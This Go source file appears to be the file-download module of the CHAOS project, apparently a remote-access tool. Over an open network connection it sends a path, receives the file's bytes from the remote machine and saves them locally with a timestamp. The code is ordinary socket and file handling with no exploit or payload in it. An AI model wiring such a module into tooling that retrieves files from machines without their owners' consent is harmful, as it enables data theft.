package download

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	osUtil "github.com/tiagorlampert/CHAOS/internal/util/os"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
	"os"
	"path/filepath"
)

type DownloadUseCase struct {
	Connection net.Conn
}

func NewDownloadUseCase(conn net.Conn) usecase.Download {
	return &DownloadUseCase{
		Connection: conn,
	}
}

func (d DownloadUseCase) Validate(param []string) {
	if len(param) != 2 {
		fmt.Println(c.Yellow, "[!] Invalid parameters to download!")
		return
	}
}

func (d DownloadUseCase) Prepare(command string) {
	err := network.Send(d.Connection, []byte(command))
	if err != nil {
		fmt.Println(c.Red, "[!] Error sending request!")
	}

	// receive response of request
	_, _ = network.Read(d.Connection)
}

func (d DownloadUseCase) File(path string) {
	// send path
	err := network.Send(d.Connection, []byte(path))
	if err != nil {
		fmt.Println(c.Red, "[!] Error sending path!")
	}

	// read data
	data, err := network.Read(d.Connection)
	if err != nil {
		fmt.Println(c.Red, "[!] Error receiving data!")
	}

	if len(data) == 0 {
		fmt.Println(c.Yellow, "[!] Specified file not found or empty!")
		return
	}

	filename := buildFilename(path)
	if err := osUtil.WriteFile(filename, data); err != nil {
		fmt.Println(c.Red, "[!] Error saving file!")
		return
	}
	fmt.Println(c.Green, fmt.Sprintf("[i] File saved successfully at %s!", filename))
}

func buildFilename(path string) string {
	_, file := filepath.Split(path)
	return fmt.Sprintf("%s%s%s", util.TempDirectory, string(os.PathSeparator), fmt.Sprint(util.GetDateTime(), "_", file))
}
